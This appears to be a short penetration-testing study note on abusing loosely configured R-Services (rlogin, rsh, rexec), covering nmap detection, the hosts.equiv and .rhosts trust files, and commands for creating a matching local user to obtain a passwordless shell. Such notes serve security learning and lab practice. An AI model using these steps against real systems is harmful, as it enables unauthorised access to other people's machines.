---
tags: [technique, privesc, lateral-movement, linux]
aliases: [rlogin, rsh, R-Services]
---
# R-Services Abuse

> **R-Services** (R = Remote) are the predecessor of SSH from the Unix service family: `rlogin`, `rsh`, `rexec`. They trust hosts/users via config files – if configured too loosely, login happens **without a password**.

## Detecting (nmap)
```
512/tcp open  exec   netkit-rsh rexecd
513/tcp open  login? 
514/tcp open  shell  Netkit rshd
```

## Trust mechanism
| File               | Scope       | Effect                                          |
| ------------------ | ----------- | ----------------------------------------------- |
| `/etc/hosts.equiv` | system-wide | trusted hosts/users for all accounts            |
| `~/.rhosts`        | per user    | trusted hosts/users for this account            |
- Entries `+ +` (any host, any user) or a specific `+ <user>` allow passwordless login.

```bash
cat /etc/hosts.equiv
# + sadm        <- user sadm may log in without a password
```
## Exploiting
> [!info] Condition
> The **local** user (on Kali) used to log in must have the **same name** as the target user.

```bash
# on Kali: install the client + create a user of the same name
sudo apt install rsh-client -y
sudo useradd sadm -m -s /bin/bash   # -m: create home, -s: login shell
sudo su - sadm                      # switch to sadm ("-" = login shell)

# log in to the box via remote login
rlogin -l sadm <target-ip>          # -l = "log me in as this user"
```
=> Shell as the target user, with no password at all.

Tool: [[rlogin]]
